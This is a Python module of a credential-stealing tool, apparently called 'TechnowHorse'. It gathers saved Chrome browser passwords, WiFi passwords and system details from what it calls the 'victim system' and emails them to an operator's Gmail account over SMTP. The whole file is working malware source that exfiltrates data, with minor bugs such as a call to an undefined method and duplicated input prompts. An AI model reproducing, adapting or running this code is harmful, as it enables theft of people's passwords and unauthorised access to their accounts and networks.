#!/usr/bin/python3
import time, smtplib, platform, getpass
import get_chrome_pass, get_wifi_pass  #Self Written Modules

#==================================================================
#Author : Pushpender Singh
#Website: https://technowlogy.tk
#==================================================================
#Usage: Module is send Saved Password of Victim machine to Email.
#==================================================================
#Github: https://github.com/Technowlogy-Pushpender/
#==================================================================

class SendPass:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.system_info = self.get_system_info()
        self.log = ""
        
    def get_chrome_browser_creds(self):
        try:
            self.log += "SAVED PASSWORDS OF Chrome Browser FROM VICTIM SYSTEM : \n"
            chrome = get_chrome_pass.GetChromePass()
            self.log += chrome.start()
        except Exception:
            time.sleep(10)
            self.get_browser_creds()            
        self.send_mail(self.log)
        self.log = ""
        
        
    def get_wifi_creds(self):
        try:
            self.log += "SAVED PASSWORDS OF WiFi FROM VICTIM SYSTEM : \n"
            wifi = get_wifi_pass.GetWifiPassword()
            self.log += wifi.start()
        except Exception:
            time.sleep(10)
            self.get_wifi_creds()         
        self.send_mail(self.log)        
        self.log = ""        

    def get_system_info(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user

    def send_mail(self, message):
        try:
            message = "Subject: TechnowHorse Reporting With Saved Password\n\n" + "Report From:\n\n" + self.system_info + "\n\n" + message
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)
            server.quit()
        except Exception as e:
            time.sleep(15)
            self.send_mail(self.log)
    
if __name__ == '__main__':
    email = input("Enter Email Address: ")
    password = input("Enter Email Address: ")    
    test = SendPass(email, password)
    test.get_wifi_creds()
    print("[+] Wifi Password Send Successfully!")
    test.get_chrome_browser_creds()
    print("[+] Chrome Browser Password Send Successfully!")    
    